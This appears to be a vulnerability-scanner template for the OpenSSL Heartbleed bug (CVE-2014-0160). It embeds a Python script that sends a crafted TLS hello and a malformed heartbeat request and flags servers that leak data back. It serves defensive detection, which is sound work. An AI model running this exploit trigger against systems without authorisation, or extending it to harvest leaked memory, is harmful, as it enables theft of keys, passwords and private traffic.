code:
- engine:
  - py
  - python3
  matchers:
  - dsl:
    - contains(response,'server is vulnerable')
    type: dsl
  source: "import os\nimport struct\nimport socket\nimport time\nimport select\nfrom\
    \ urllib.parse import urlparse\n\ndef h2bin(x):\n    return bytes.fromhex(x.replace('\
    \ ', '').replace('\\n', ''))\n\nhello = h2bin('''\n16 03 02 00  dc 01 00 00 d8\
    \ 03 02 53\n43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\nbd 39 04 cc 16 0a\
    \ 85 03  90 9f 77 04 33 d4 de 00\n00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00\
    \ 88\n00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c\nc0 1b 00 16 00 13 c0 0d\
    \  c0 03 00 0a c0 13 c0 09\nc0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44\n\
    c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c\nc0 02 00 05 00 04 00 15  00\
    \ 12 00 09 00 14 00 11\n00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04\n03 00\
    \ 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19\n00 0b 00 0c 00 18 00 09  00 0a 00\
    \ 16 00 17 00 08\n00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13\n00 01 00 02\
    \ 00 03 00 0f  00 10 00 11 00 23 00 00\n00 0f 00 01 01\n''')\n\nhb = h2bin('''\n\
    18 03 02 00 03\n01 40 00\n''')\n\ndef recvall(s, length, timeout=5):\n    endtime\
    \ = time.time() + timeout\n    rdata = b''\n    remain = length\n    while remain\
    \ > 0:\n        rtime = endtime - time.time()\n        if rtime < 0:\n       \
    \     return None\n        r, _, _ = select.select([s], [], [], 5)\n        if\
    \ s in r:\n            data = s.recv(remain)\n            if not data:\n     \
    \           return None\n            rdata += data\n            remain -= len(data)\n\
    \    return rdata\n\ndef recvmsg(s):\n    hdr = recvall(s, 5)\n    if hdr is None:\n\
    \        return None, None, None\n    typ, ver, ln = struct.unpack('>BHH', hdr)\n\
    \    pay = recvall(s, ln, 10)\n    if pay is None:\n        return None, None,\
    \ None\n    return typ, ver, pay\n\ndef hit_hb(s):\n    s.send(hb)\n    while\
    \ True:\n        typ, ver, pay = recvmsg(s)\n        if typ is None:\n       \
    \     return False\n        if typ == 24:  # Heartbeat response\n            if\
    \ len(pay) > 3:\n                print('server is vulnerable')\n             \
    \   return True\n            return False\n        if typ == 21:  # Server alert\n\
    \            return False\n\ndef main():\n    # Get the URL from the environment\
    \ variable\n    url = os.getenv('url')\n    if not url:\n        print(\"URL environment\
    \ variable is not set.\")\n        return\n\n    # Parse the URL\n    parsed_url\
    \ = urlparse(url)\n    host = parsed_url.hostname\n    port = parsed_url.port\
    \ if parsed_url.port else 443\n\n    if not host:\n        return\n\n    # Create\
    \ a socket connection\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\
    \    s.connect((host, port))\n\n    # Send Client Hello\n    s.send(hello)\n\n\
    \    # Wait for Server Hello\n    while True:\n        typ, ver, pay = recvmsg(s)\n\
    \        if typ is None:\n            return\n        if typ == 22 and pay[0]\
    \ == 0x0E:  # Server hello done\n            break\n\n    # Send Heartbeat request\
    \ and check vulnerability\n    s.send(hb)\n    hit_hb(s)\n\nif __name__ == '__main__':\n\
    \    main()\n"
id: CVE-2014-0160
info:
  author: pussycat0x
  classification:
    epss-percentile: 0.99994
    epss-score: 0.94464
  description: 'The Heartbleed bug allows anyone on the Internet to read the memory
    of the systems protected by the vulnerable versions of the OpenSSL software. This
    compromises the secret keys used to identify the service providers and to encrypt
    the traffic, the names and passwords of the users, and the actual content. This
    allows attackers to eavesdrop on communications, steal data directly from the
    services and users, and impersonate services and users.

    '
  impact: 'Attackers can eavesdrop, steal sensitive data, impersonate services, and
    compromise user credentials.

    '
  metadata:
    verified: true
  name: OpenSSL Heartbleed Vulnerability
  reference:
  - https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160
  remediation: 'Apply the latest security patches and updates from the vendor to address
    this vulnerability.

    '
  severity: high
  tags: cve,cve2014,openssl,heartbleed,code,kev,vkev,vuln
variables:
  url: '{{RootURL}}'
